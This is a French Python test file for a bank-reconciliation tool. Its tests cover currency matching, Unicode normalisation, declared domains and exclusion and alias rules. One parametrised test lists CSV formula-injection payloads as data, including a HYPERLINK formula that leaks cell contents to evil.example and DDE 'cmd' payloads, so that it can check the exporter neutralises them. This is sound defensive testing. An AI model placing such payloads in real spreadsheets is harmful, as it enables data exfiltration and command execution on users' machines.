"""Corrections issues de la revue adversariale, dans les modules du chef de projet.

Chaque test correspond a un defaut reel trouve par un reviewer independant :
devise ignoree par le moteur, formules de tableur dans les CSV, codes dossier
en forme Unicode decomposee, domaines declares.
"""

from __future__ import annotations

import csv
import datetime as dt
import sys
import unicodedata
from decimal import Decimal
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "src"))

from rapprochement.modeles import OperationBancaire, Piece, Rapprochement, Sens, Statut  # noqa: E402
from rapprochement.moteur import Moteur  # noqa: E402
from rapprochement.exclusions import Referentiel  # noqa: E402
from rapprochement.parseurs import ErreurFormat, lire_alias, lire_dossiers, lire_pieces, lire_releve  # noqa: E402
from rapprochement.rapport import ecrire_suivi, ligne_sure, neutraliser_formule  # noqa: E402


# ---------------------------------------------------------------- devise


def _operation(devise: str) -> OperationBancaire:
    return OperationBancaire(
        reference="R1", dossier="D1", date_operation=dt.date(2026, 4, 12),
        libelle="PRLV SEPA ORANGE FRANCE", montant=Decimal("100.00"),
        sens=Sens.DEBIT, devise=devise,
    )


def _piece(devise: str) -> Piece:
    return Piece(
        id_piece="P1", dossier="D1", fichier="orange.pdf", fournisseur="Orange France",
        date_facture=dt.date(2026, 4, 10), montant_ttc=Decimal("100.00"), devise=devise,
    )


def test_une_facture_dans_une_autre_devise_ne_justifie_pas_l_operation():
    resultat = Moteur().rapprocher([_operation("USD")], [_piece("EUR")])[0]
    assert resultat.statut is Statut.MANQUANT, (
        "100 USD ne sont pas justifies par une facture de 100 EUR : la vraie "
        "piece ne serait jamais reclamee"
    )


def test_meme_devise_justifie_toujours():
    for devise in ("EUR", "USD"):
        resultat = Moteur().rapprocher([_operation(devise)], [_piece(devise)])[0]
        assert resultat.statut is Statut.JUSTIFIE


# ---------------------------------------------------------------- formules CSV


@pytest.mark.parametrize(
    "dangereux",
    [
        "=HYPERLINK(\"http://evil.example/?x=\"&A1,\"clic\")",
        "+cmd|' /C calc'!A0",
        "-2+3+cmd|' /C calc'!A0",
        "@SUM(1+1)*cmd|' /C calc'!A0",
        "\t=1+1",
        "\r=1+1",
    ],
)
def test_une_formule_est_neutralisee(dangereux):
    assert neutraliser_formule(dangereux) == "'" + dangereux


@pytest.mark.parametrize("sur", ["ORANGE FRANCE", "", "89.90", "-12.50", "+3", "12,5", "a=b", "café"])
def test_un_texte_normal_ou_un_nombre_reste_intact(sur):
    assert neutraliser_formule(sur) == sur


def test_ligne_sure_ne_touche_que_le_texte():
    assert ligne_sure(["=1+1", 5, Decimal("-1"), None, "ok"]) == ["'=1+1", 5, Decimal("-1"), None, "ok"]


def test_le_tableau_de_suivi_neutralise_les_libelles_dangereux(tmp_path):
    operation = OperationBancaire(
        reference="R1", dossier="D1", date_operation=dt.date(2026, 4, 12),
        libelle="=HYPERLINK(\"http://evil.example\")", montant=Decimal("10.00"),
        sens=Sens.DEBIT,
    )
    chemin = ecrire_suivi(
        [Rapprochement(operation=operation, statut=Statut.MANQUANT, motif="+cmd", regle="aucun_candidat")],
        tmp_path / "suivi.csv",
    )
    ligne = next(csv.DictReader(open(chemin, newline="", encoding="utf-8")))
    assert ligne["libelle"].startswith("'=")
    assert ligne["motif"].startswith("'+")
    assert ligne["montant"] == "10.00"


# ---------------------------------------------------------------- NFC


def test_code_dossier_decompose_equivaut_au_code_compose(tmp_path):
    compose = "HÉLOISE-BTP"
    decompose = unicodedata.normalize("NFD", compose)
    assert compose != decompose

    releve = tmp_path / "releve.csv"
    releve.write_text(
        "dossier,date_operation,libelle,debit,credit,reference\n"
        f"{decompose},2026-04-12,PRLV ORANGE,89.90,,R1\n",
        encoding="utf-8",
    )
    pieces = tmp_path / "pieces.csv"
    pieces.write_text(
        "id_piece,dossier,fournisseur,date_facture,montant_ttc\n"
        f"P1,{compose},Orange France,2026-04-10,89.90\n",
        encoding="utf-8",
    )
    dossiers = tmp_path / "dossiers.csv"
    dossiers.write_text(
        "dossier,raison_sociale,email_contact\n" f"{decompose},Heloise BTP,c@heloise.fr\n",
        encoding="utf-8",
    )
    assert lire_releve(releve)[0].dossier == compose
    assert lire_pieces(pieces)[0].dossier == compose
    assert list(lire_dossiers(dossiers)) == [compose]


# ---------------------------------------------------------------- domaines declares


def _dossiers(tmp_path, domaines: str) -> dict:
    chemin = tmp_path / "dossiers.csv"
    chemin.write_text(
        "dossier,raison_sociale,email_contact,domaines\n"
        f'D1,Martin SARL,compta@martin.fr,"{domaines}"\n',
        encoding="utf-8",
    )
    return lire_dossiers(chemin)


def test_domaines_declares_lus_normalises(tmp_path):
    assert _dossiers(tmp_path, " Martin-BTP.fr ; martin.fr ")["D1"].domaines == (
        "martin-btp.fr",
        "martin.fr",
    )


def test_aucun_domaine_par_defaut(tmp_path):
    assert _dossiers(tmp_path, "")["D1"].domaines == ()


@pytest.mark.parametrize("invalide", ["pirate@martin.fr", "martin", "mar tin.fr"])
def test_domaine_invalide_refuse_avec_un_message_clair(tmp_path, invalide):
    with pytest.raises(ErreurFormat, match="domaine"):
        _dossiers(tmp_path, invalide)


@pytest.mark.parametrize("non_ascii", ["stra\u00dfe.de", "caf\u00e9.fr", "\u043f\u0440\u0438\u043c\u0435\u0440.ru"])
def test_domaine_non_ascii_refuse_avec_la_forme_a_declarer(tmp_path, non_ascii):
    with pytest.raises(ErreurFormat, match="punycode"):
        _dossiers(tmp_path, non_ascii)


def test_domaine_punycode_accepte(tmp_path):
    assert _dossiers(tmp_path, "xn--strae-oqa.de")["D1"].domaines == ("xn--strae-oqa.de",)


# ---------------------------------------------------------------- circuit obligatoire (D6)


def _dossier_sans_circuit(tmp_path, avec_colonne: bool):
    chemin = tmp_path / "dossiers.csv"
    if avec_colonne:
        chemin.write_text("dossier,raison_sociale,email_contact,circuit\nD1,Martin SARL,c@martin.fr,\n", encoding="utf-8")
    else:
        chemin.write_text("dossier,raison_sociale,email_contact\nD1,Martin SARL,c@martin.fr\n", encoding="utf-8")
    return chemin


@pytest.mark.parametrize("avec_colonne", [True, False])
def test_circuit_manquant_refuse_quand_il_est_obligatoire(tmp_path, avec_colonne):
    with pytest.raises(ErreurFormat, match="circuit manquant"):
        lire_dossiers(_dossier_sans_circuit(tmp_path, avec_colonne), circuit_obligatoire=True)


@pytest.mark.parametrize("avec_colonne", [True, False])
def test_circuit_manquant_garde_le_comportement_historique_par_defaut(tmp_path, avec_colonne):
    assert lire_dossiers(_dossier_sans_circuit(tmp_path, avec_colonne))["D1"].circuit == "C-DIRECT"


def test_circuit_explicite_accepte_quand_il_est_obligatoire(tmp_path):
    chemin = tmp_path / "dossiers.csv"
    chemin.write_text(
        "dossier,raison_sociale,email_contact,circuit,email_relais\n"
        "D1,Martin SARL,c@martin.fr,C-RELAIS,relais@cabinet.fr\n",
        encoding="utf-8",
    )
    assert lire_dossiers(chemin, circuit_obligatoire=True)["D1"].destinataire == "relais@cabinet.fr"


# ---------------------------------------------------------------- regles d'exclusion tracees (A3)


def _op(libelle, dossier="D1"):
    return OperationBancaire(
        reference="R1", dossier=dossier, date_operation=dt.date(2026, 4, 12),
        libelle=libelle, montant=Decimal("120.00"), sens=Sens.DEBIT,
    )


def _regles(tmp_path, contenu: str, octets_bom: bool = False):
    chemin = tmp_path / "exclusions_dossier.csv"
    chemin.write_bytes((b"\xef\xbb\xbf" if octets_bom else b"") + contenu.encode("utf-8"))
    return Referentiel.depuis_csv(chemin)


def test_une_regle_validee_s_applique_et_porte_son_nom(tmp_path):
    ref = _regles(tmp_path, "dossier,motif_regex,motif,nom,auteur,date_activation,statut\n"
                            "D1,syndic copropriete,Appel de fonds,syndic,Alice,2026-04-01,validee\n")
    exclue, motif, regle = ref.exclure(_op("PRLV SYNDIC COPROPRIETE LES LILAS"))
    assert exclue and motif == "Appel de fonds" and regle == "apprise:D1:syndic"


def test_une_regle_proposee_ne_s_applique_pas_et_reste_visible(tmp_path):
    ref = _regles(tmp_path, "dossier,motif_regex,motif,nom,auteur,date_activation,statut\n"
                            "D1,.*,Tout exclure,trop_large,Bob,2026-04-02,proposee\n")
    assert ref.exclure(_op("PRLV ORANGE FRANCE"))[0] is False, (
        "une regle seulement proposee ne doit jamais clore une piece : elle serait terminale et intracable"
    )
    assert [r["nom"] for r in ref.provisoires] == ["trop_large"]
    assert ref.provisoires[0]["auteur"] == "Bob"


def test_le_format_historique_a_trois_colonnes_reste_valide(tmp_path):
    ref = _regles(tmp_path, "dossier,motif_regex,motif\nD1,syndic copropriete,Appel de fonds\n")
    assert ref.exclure(_op("PRLV SYNDIC COPROPRIETE"))[2] == "apprise:D1"
    assert ref.provisoires == []


def test_un_fichier_de_regles_avec_bom_est_lisible(tmp_path):
    ref = _regles(tmp_path, "dossier,motif_regex,motif\nD1,syndic,Appel de fonds\n", octets_bom=True)
    assert ref.exclure(_op("PRLV SYNDIC"))[0] is True


def test_une_expression_reguliere_invalide_est_refusee_avec_son_numero_de_ligne(tmp_path):
    with pytest.raises(ErreurFormat, match=r"ligne 3.*expression reguliere invalide"):
        _regles(tmp_path, "dossier,motif_regex,motif\nD1,ok,Ok\nD1,(syndic,Casse\n")


@pytest.mark.parametrize("contenu,attendu", [
    ("dossier,motif_regex,motif,statut\nD1,x,M,brouillon\n", "statut"),
    ("dossier,motif\nD1,M\n", "motif_regex"),
    ("dossier,motif_regex\n,x\n", "obligatoires"),
])
def test_un_fichier_de_regles_mal_forme_donne_un_refus_lisible(tmp_path, contenu, attendu):
    with pytest.raises(ErreurFormat, match=attendu):
        _regles(tmp_path, contenu)


# ---------------------------------------------------------------- alias fournisseurs (A15)


def test_alias_lus_avec_bom_et_resolvent_un_libelle_abrege(tmp_path):
    chemin = tmp_path / "alias_fournisseurs.csv"
    chemin.write_bytes(b"\xef\xbb\xbfalias,fournisseur\namzn mktplace,Amazon EU Sarl\n")
    alias = lire_alias(chemin)
    assert alias == {"amzn mktplace": "Amazon EU Sarl"}

    ops = [OperationBancaire("R1", "D1", dt.date(2026, 4, 12), "CARTE 11/04 AMZN MKTPLACE FR",
                             Decimal("447.03"), Sens.DEBIT)]
    facture = Piece("P1", "D1", "f.pdf", "Amazon EU Sarl", dt.date(2026, 4, 10), Decimal("447.03"))
    sans = Moteur().rapprocher(ops, [facture])[0]
    avec = Moteur(alias=alias).rapprocher(ops, [facture])[0]
    assert avec.confiance > sans.confiance, "l'alias doit renforcer l'appariement d'un libelle abrege"


def test_alias_absent_ou_chemin_none_donnent_aucun_alias(tmp_path):
    assert lire_alias(tmp_path / "absent.csv") == {}
    assert lire_alias(None) == {}


@pytest.mark.parametrize("contenu", ["alias\nx\n", "alias,fournisseur\n,Amazon\n", "alias,fournisseur\nx,\n"])
def test_alias_mal_forme_donne_un_refus_lisible(tmp_path, contenu):
    chemin = tmp_path / "alias_fournisseurs.csv"
    chemin.write_text(contenu, encoding="utf-8")
    with pytest.raises(ErreurFormat):
        lire_alias(chemin)


def _alias(tmp_path, lignes):
    chemin = tmp_path / "alias_fournisseurs.csv"
    chemin.write_text("alias,fournisseur\n" + "\n".join(lignes) + "\n", encoding="utf-8")
    return chemin


def test_un_alias_en_double_avec_deux_fournisseurs_differents_est_refuse(tmp_path):
    chemin = _alias(tmp_path, ["amzn mktplace,Amazon EU Sarl", "AMZN  MKTPLACE,Amazon Business"])
    with pytest.raises(ErreurFormat, match=r"ligne 3.*deja defini ligne 2"):
        lire_alias(chemin)


def test_un_alias_repete_avec_le_meme_fournisseur_est_tolere(tmp_path):
    chemin = _alias(tmp_path, ["amzn mktplace,Amazon EU Sarl", "AMZN MKTPLACE,Amazon EU Sarl"])
    assert set(lire_alias(chemin).values()) == {"Amazon EU Sarl"}


@pytest.mark.parametrize("vide_une_fois_normalise", ["virement", "prlv sepa", "..."])
def test_un_alias_vide_une_fois_normalise_est_refuse(tmp_path, vide_une_fois_normalise):
    with pytest.raises(ErreurFormat, match="vide une fois normalise"):
        lire_alias(_alias(tmp_path, [f"{vide_une_fois_normalise},Amazon EU Sarl"]))

